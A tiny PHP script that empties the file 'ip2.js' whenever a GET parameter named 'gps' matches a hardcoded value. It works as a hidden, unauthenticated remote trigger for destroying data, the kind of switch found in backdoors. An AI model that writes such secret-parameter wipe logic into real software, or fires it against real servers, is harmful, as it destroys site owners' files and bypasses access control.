<?php
if($_GET['gps']=="123456789"){
$file = fopen("ip2.js","w");
echo fwrite($file,"");
fclose($file);
}